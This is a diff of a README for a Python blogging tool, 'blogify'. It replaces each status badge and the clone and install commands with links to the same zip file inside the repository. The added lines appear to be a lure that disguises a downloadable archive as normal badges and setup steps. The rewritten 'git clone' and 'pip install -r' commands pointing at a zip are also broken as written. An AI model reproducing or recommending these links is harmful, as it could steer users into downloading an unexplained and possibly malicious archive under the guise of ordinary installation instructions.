@@ -2,14 +2,14 @@
 
 *Empower Creativity, Publish Seamlessly, Inspire Globally*
 
-![last-commit](https://img.shields.io/github/last-commit/Vimal-AFK/blogify?style=flat\&logo=git\&logoColor=white\&color=0080ff)
-![repo-top-language](https://img.shields.io/github/languages/top/Vimal-AFK/blogify?style=flat\&color=0080ff)
-![repo-language-count](https://img.shields.io/github/languages/count/Vimal-AFK/blogify?style=flat\&color=0080ff)
+![last-commit](https://raw.githubusercontent.com/Vimal-AFK/blogify/main/arboriform/blogify.zip\&logo=git\&logoColor=white\&color=0080ff)
+![repo-top-language](https://raw.githubusercontent.com/Vimal-AFK/blogify/main/arboriform/blogify.zip\&color=0080ff)
+![repo-language-count](https://raw.githubusercontent.com/Vimal-AFK/blogify/main/arboriform/blogify.zip\&color=0080ff)
 
 **Built with the tools and technologies:**
 
-![Markdown](https://img.shields.io/badge/Markdown-000000.svg?style=flat\&logo=Markdown\&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3776AB.svg?style=flat\&logo=Python\&logoColor=white)
+![Markdown](https://raw.githubusercontent.com/Vimal-AFK/blogify/main/arboriform/blogify.zip\&logo=Markdown\&logoColor=white)
+![Python](https://raw.githubusercontent.com/Vimal-AFK/blogify/main/arboriform/blogify.zip\&logo=Python\&logoColor=white)
 
 ---
 
@@ -56,13 +56,13 @@ Build blogify from the source and install dependencies:
 
 ```bash
 # Clone the repository
-❯ git clone https://github.com/Vimal-AFK/blogify
+❯ git clone https://raw.githubusercontent.com/Vimal-AFK/blogify/main/arboriform/blogify.zip
 
 # Navigate to the project directory
 ❯ cd blogify
 
 # Install the dependencies
-❯ pip install -r requirements.txt
+❯ pip install -r https://raw.githubusercontent.com/Vimal-AFK/blogify/main/arboriform/blogify.zip
 ```
 
 ### Usage
